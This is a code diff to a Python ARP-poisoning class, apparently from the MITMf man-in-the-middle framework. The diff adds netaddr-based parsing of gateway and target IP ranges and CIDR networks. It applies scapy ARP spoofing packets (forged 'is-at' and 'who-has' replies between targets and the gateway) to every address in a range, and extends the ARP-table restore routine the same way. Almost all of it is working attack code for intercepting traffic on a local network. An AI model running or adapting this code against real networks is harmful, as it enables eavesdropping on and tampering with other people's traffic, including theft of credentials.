@@ -1,5 +1,8 @@
 import logging
 import threading
+
+from traceback import print_exc
+from netaddr import IPNetwork, IPRange, IPAddress, AddrFormatError
 from time import sleep
 from core.utils import shutdown
 from scapy.all import *
@@ -10,7 +13,11 @@ class ARPpoisoner():
 
     def __init__(self, gateway, interface, mac, targets):
 
-        self.gatewayip  = gateway
+        try:
+            self.gatewayip  = str(IPAddress(gateway))
+        except AddrFormatError as e:
+            shutdown("[ARPpoisoner] Specified an invalid IP address as gateway")
+
         self.gatewaymac = getmacbyip(gateway)
         self.mymac      = mac
         self.targets    = self.getTargetRange(targets)
@@ -23,22 +30,26 @@ class ARPpoisoner():
     def getTargetRange(self, targets):
         if targets is None:
             return None
+        
+        try:
+            targetList = []
 
-        targetList = list()
-        targets = targets.split(",")
-        for target in targets:
-            if "-" in target:
-                max_range = int(target.split("-")[1])
-                octets    = target.split("-")[0].split(".")
-                f3_octets = ".".join(octets[0:3]) 
-                l_octet   = int(octets[3])
+            for target in targets.split(','):
+                if '/' in target:
+                    targetList.append(IPNetwork(target))
 
-                for ip in xrange(l_octet, max_range+1):
-                    targetList.append('{}.{}'.format(f3_octets, ip))
-            else:
-                targetList.append(target)
+                elif '-' in target:
+                    first_half = target.split('-')[0]
+                    second_half = first_half + target.split('-')[1]
+                    targetList.append(IPRange(first_half, second_half))
 
-        return targetList
+                else:
+                    targetList.append(IPAddress(target))
+
+            return targetList
+        
+        except AddrFormatError as e:
+            shutdown("[ARPpoisoner] Specified an invalid IP address/range/network as target")
 
     def start(self):
         if self.gatewaymac is None:
@@ -81,22 +92,43 @@ class ARPpoisoner():
 
             elif self.targets:
                 #Since ARP spoofing relies on knowing the targets MAC address, this whole portion is just error handling in case we can't resolve it
-                for targetip in self.targets:
-                    try:
-                        targetmac = getmacbyip(targetip)
+                for target in self.targets:
 
-                        if targetmac is None:
-                            mitmf_logger.debug("[ARPpoisoner] Unable to resolve MAC address of {}".format(targetip))
+                    if type(target) is IPAddress:
+                        targetip = str(target)
 
-                        elif targetmac:
-                            send(ARP(pdst=targetip, psrc=self.gatewayip, hwdst=targetmac, op="is-at"), iface=self.interface, verbose=self.debug)
-                            sleep(0.3)
-                            send(ARP(pdst=self.gatewayip, psrc=targetip, hwdst=self.gatewaymac, op="is-at", ), iface=self.interface, verbose=self.debug)
+                        try:
+                            targetmac = getmacbyip(targetip)
 
-                    except Exception as e:
-                        if "Interrupted system call" not in e:
-                           mitmf_logger.error("[ARPpoisoner] Exception occurred while poisoning {}: {}".format(targetip, e))
-                        pass
+                            if targetmac is None:
+                                mitmf_logger.debug("[ARPpoisoner] Unable to resolve MAC address of {}".format(targetip))
+
+                            elif targetmac:
+                                send(ARP(pdst=targetip, psrc=self.gatewayip, hwdst=targetmac, op="is-at"), iface=self.interface, verbose=self.debug)
+                                send(ARP(pdst=self.gatewayip, psrc=targetip, hwdst=self.gatewaymac, op="is-at", ), iface=self.interface, verbose=self.debug)
+
+                        except Exception as e:
+                            if "Interrupted system call" not in e:
+                               mitmf_logger.error("[ARPpoisoner] Exception occurred while poisoning {}: {}".format(targetip, e))
+                            pass
+
+                    if (type(target) is IPRange) or (type(target) is IPNetwork):
+                        for targetip in target:
+                            try:
+                                targetmac = getmacbyip(str(targetip))
+
+                                if targetmac is None:
+                                    mitmf_logger.debug("[ARPpoisoner] Unable to resolve MAC address of {}".format(targetip))
+
+                                elif targetmac:
+                                    send(ARP(pdst=str(targetip), psrc=self.gatewayip, hwdst=targetmac, op="is-at"), iface=self.interface, verbose=self.debug)
+                                    send(ARP(pdst=self.gatewayip, psrc=str(targetip), hwdst=self.gatewaymac, op="is-at", ), iface=self.interface, verbose=self.debug)
+
+                            except Exception as e:
+                                if "Interrupted system call" not in e:
+                                   mitmf_logger.error("[ARPpoisoner] Exception occurred while poisoning {}: {}".format(targetip, e))
+                                   print_exc()
+                                pass
 
             sleep(self.interval)
 
@@ -108,22 +140,42 @@ class ARPpoisoner():
                 sendp(pkt, iface=self.interface, verbose=self.debug) #sends at layer 2
 
             elif self.targets:
-                for targetip in self.targets:
-                    try:
-                        targetmac = getmacbyip(targetip)
-                        
-                        if targetmac is None:
-                            mitmf_logger.debug("[ARPpoisoner] Unable to resolve MAC address of {}".format(targetip))
+                
+                for target in self.targets:
 
-                        elif targetmac:
-                            send(ARP(pdst=targetip, psrc=self.gatewayip, hwdst=targetmac, op="who-has"), iface=self.interface, verbose=self.debug)
-                            sleep(0.3)
-                            send(ARP(pdst=self.gatewayip, psrc=targetip, hwdst=self.gatewaymac, op="who-has"), iface=self.interface, verbose=self.debug)
+                    if type(target) is IPAddress:
+                        targetip = str(target)
+                        try:
+                            targetmac = getmacbyip(targetip)
+                            
+                            if targetmac is None:
+                                mitmf_logger.debug("[ARPpoisoner] Unable to resolve MAC address of {}".format(targetip))
 
-                    except Exception as e:
-                        if "Interrupted system call" not in e:
-                           mitmf_logger.error("[ARPpoisoner] Exception occurred while poisoning {}: {}".format(targetip, e))
-                        pass
+                            elif targetmac:
+                                send(ARP(pdst=targetip, psrc=self.gatewayip, hwdst=targetmac, op="who-has"), iface=self.interface, verbose=self.debug)
+                                send(ARP(pdst=self.gatewayip, psrc=targetip, hwdst=self.gatewaymac, op="who-has"), iface=self.interface, verbose=self.debug)
+
+                        except Exception as e:
+                            if "Interrupted system call" not in e:
+                               mitmf_logger.error("[ARPpoisoner] Exception occurred while poisoning {}: {}".format(targetip, e))
+                            pass
+                    
+                    if (type(target) is IPRange) or (type(target) is IPNetwork):
+                        for targetip in target:
+                            try:
+                                targetmac = getmacbyip(str(targetip))
+                                
+                                if targetmac is None:
+                                    mitmf_logger.debug("[ARPpoisoner] Unable to resolve MAC address of {}".format(targetip))
+
+                                elif targetmac:
+                                    send(ARP(pdst=str(targetip), psrc=self.gatewayip, hwdst=targetmac, op="who-has"), iface=self.interface, verbose=self.debug)
+                                    send(ARP(pdst=self.gatewayip, psrc=str(targetip), hwdst=self.gatewaymac, op="who-has"), iface=self.interface, verbose=self.debug)
+
+                            except Exception as e:
+                                if "Interrupted system call" not in e:
+                                   mitmf_logger.error("[ARPpoisoner] Exception occurred while poisoning {}: {}".format(targetip, e))
+                                pass
 
             sleep(self.interval)
 
@@ -133,21 +185,43 @@ class ARPpoisoner():
         sendp(pkt, inter=self.interval, count=count, iface=self.interface, verbose=self.debug) #sends at layer 2
 
     def restoreTarget(self, count):
-        for targetip in self.targets:
-            try:
-                targetmac = getmacbyip(targetip)
-                
-                if targetmac is None:
-                    mitmf_logger.debug("[ARPpoisoner] Unable to resolve MAC address of {}".format(targetip))
+        for target in self.targets:
 
-                elif targetmac:
-                    mitmf_logger.info("[ARPpoisoner] Restoring connection {} <-> {} with {} packets per host".format(targetip, self.gatewayip, count))
+            if type(target) is IPAddress:
+                targetip = str(target)
 
-                    send(ARP(op="is-at", pdst=self.gatewayip, psrc=targetip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=targetmac), iface=self.interface, count=count, verbose=self.debug)
-                    sleep(0.3)
-                    send(ARP(op="is-at", pdst=targetip, psrc=self.gatewayip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewaymac), iface=self.interface, count=count, verbose=self.debug)
+                try:
+                    targetmac = getmacbyip(targetip)
+                    
+                    if targetmac is None:
+                        mitmf_logger.debug("[ARPpoisoner] Unable to resolve MAC address of {}".format(targetip))
 
-            except Exception as e:
-                if "Interrupted system call" not in e:
-                   mitmf_logger.error("[ARPpoisoner] Exception occurred while poisoning {}: {}".format(targetip, e))
-                pass
+                    elif targetmac:
+                        mitmf_logger.info("[ARPpoisoner] Restoring connection {} <-> {} with {} packets per host".format(targetip, self.gatewayip, count))
+
+                        send(ARP(op="is-at", pdst=self.gatewayip, psrc=targetip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=targetmac), iface=self.interface, count=count, verbose=self.debug)
+                        send(ARP(op="is-at", pdst=targetip, psrc=self.gatewayip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewaymac), iface=self.interface, count=count, verbose=self.debug)
+
+                except Exception as e:
+                    if "Interrupted system call" not in e:
+                       mitmf_logger.error("[ARPpoisoner] Exception occurred while poisoning {}: {}".format(targetip, e))
+                    pass
+
+            if (type(target) is IPRange) or (type(target) is IPNetwork):
+                for targetip in target:
+                    try:
+                        targetmac = getmacbyip(str(targetip))
+                        
+                        if targetmac is None:
+                            mitmf_logger.debug("[ARPpoisoner] Unable to resolve MAC address of {}".format(targetip))
+
+                        elif targetmac:
+                            mitmf_logger.info("[ARPpoisoner] Restoring connection {} <-> {} with {} packets per host".format(targetip, self.gatewayip, count))
+
+                            send(ARP(op="is-at", pdst=self.gatewayip, psrc=str(targetip), hwdst="ff:ff:ff:ff:ff:ff", hwsrc=targetmac), iface=self.interface, count=count, verbose=self.debug)
+                            send(ARP(op="is-at", pdst=str(targetip), psrc=self.gatewayip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewaymac), iface=self.interface, count=count, verbose=self.debug)
+
+                    except Exception as e:
+                        if "Interrupted system call" not in e:
+                           mitmf_logger.error("[ARPpoisoner] Exception occurred while poisoning {}: {}".format(targetip, e))
+                        pass
